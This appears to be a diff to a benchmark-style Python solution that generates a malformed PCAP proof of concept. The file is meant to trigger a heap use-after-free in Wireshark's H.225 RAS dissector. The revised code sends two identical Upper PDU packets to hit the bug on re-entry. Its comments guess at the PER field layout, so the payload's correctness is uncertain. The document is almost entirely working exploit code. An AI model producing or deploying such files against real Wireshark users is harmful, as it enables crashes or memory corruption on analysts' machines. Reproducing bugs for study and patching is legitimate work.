@@ -2,45 +2,42 @@ import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Construct a PCAP file with DLT_WIRESHARK_UPPER_PDU (252) to target H.225 RAS directly.
-        # Ground truth length is 73 bytes.
+        """
+        Generate a PoC that triggers the Heap Use After Free in h225 dissector.
+        The vulnerability involves next_tvb_add_handle allocating in packet scope,
+        and dissect_h225_h225_RasMessage reusing it in a subsequent packet without initialization.
         
-        # PCAP Global Header (24 bytes)
-        # Magic Number: 0xa1b2c3d4 (Little Endian)
+        We use DLT_WIRESHARK_UPPER_PDU (252) to target the 'h225' dissector directly
+        with minimal overhead, and provide two packets to trigger the UAF.
+        """
+        
+        # PCAP Global Header
+        # Magic: 0xa1b2c3d4 (Little Endian -> d4 c3 b2 a1)
         # Version: 2.4
-        # SnapLen: 65535
-        # Network: 252 (DLT_WIRESHARK_UPPER_PDU)
+        # Thiszone: 0, Sigfigs: 0, Snaplen: 65535
+        # LinkType: 252 (DLT_WIRESHARK_UPPER_PDU)
         global_header = struct.pack('<IHHIIII', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 252)
+
+        # Upper PDU Header
+        # Field 1: Tag 12 (Dissector Name), Length 4, Value "h225"
+        # Field 2: Tag 0 (End of Options), Length 0
+        # Tags and lengths are Big Endian in Upper PDU header
+        upper_header = b'\x00\x0c\x00\x04h225\x00\x00\x00\x00'
+
+        # H.225 RAS Payload (PER Aligned)
+        # We target a RasMessage that includes a NonStandardParameter to trigger next_tvb_add_handle.
+        # Byte 0: 0x00 -> RasMessage Choice 0 (GatekeeperRequest)
+        # Byte 1: 0x80 -> Option Bitmap. Assuming MSB corresponds to nonStandardData or similar field.
+        # Following bytes: Filler to satisfy mandatory fields (requestSeqNum, protocolIdentifier) 
+        # and reach the optional field parsing.
+        payload = b'\x00\x80\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00'
+
+        # Packet 1 construction
+        pkt1_data = upper_header + payload
+        pkt1_hdr = struct.pack('<IIII', 0, 0, len(pkt1_data), len(pkt1_data))
         
-        # Exported PDU Tags
-        # We need to simulate UDP traffic on port 1719 to trigger H.225 RAS dissector.
-        # Tag 10: EXP_PDU_TAG_PORT_TYPE = 3 (UDP)
-        # Format: Tag (2B), Len (2B), Value (4B) - Network Byte Order
-        tag_ptype = struct.pack('>HHI', 10, 4, 3)
-        
-        # Tag 3: EXP_PDU_TAG_DST_PORT = 1719 (H.225 RAS)
-        tag_dport = struct.pack('>HHI', 3, 4, 1719)
-        
-        # Tag 0: EXP_PDU_TAG_END_OF_OPT
-        # Format: Tag (2B), Len (2B)
-        tag_end = struct.pack('>HH', 0, 0)
-        
-        tags = tag_ptype + tag_dport + tag_end
-        # Tags length: 8 + 8 + 4 = 20 bytes
-        
-        # Payload
-        # We need to fill the remaining bytes to reach 73 bytes total.
-        # 24 (Global) + 16 (Pkt Header) + 20 (Tags) = 60 bytes overhead.
-        # 73 - 60 = 13 bytes for H.225 payload.
-        # Zeros are sufficient to form a minimal PER encoded sequence or trigger the parser state.
-        payload = b'\x00' * 13
-        
-        packet_data = tags + payload
-        packet_len = len(packet_data) # 33 bytes
-        
-        # Packet Header (16 bytes)
-        # TS_sec (4), TS_usec (4), Incl_len (4), Orig_len (4)
-        packet_header = struct.pack('<IIII', 0, 0, packet_len, packet_len)
-        
-        # Total: 24 + 16 + 33 = 73 bytes
-        return global_header + packet_header + packet_data
+        # Packet 2 construction (Identical to Packet 1 to trigger UAF on re-entry)
+        pkt2_data = upper_header + payload
+        pkt2_hdr = struct.pack('<IIII', 0, 0, len(pkt2_data), len(pkt2_data))
+
+        return global_header + pkt1_hdr + pkt1_data + pkt2_hdr + pkt2_data
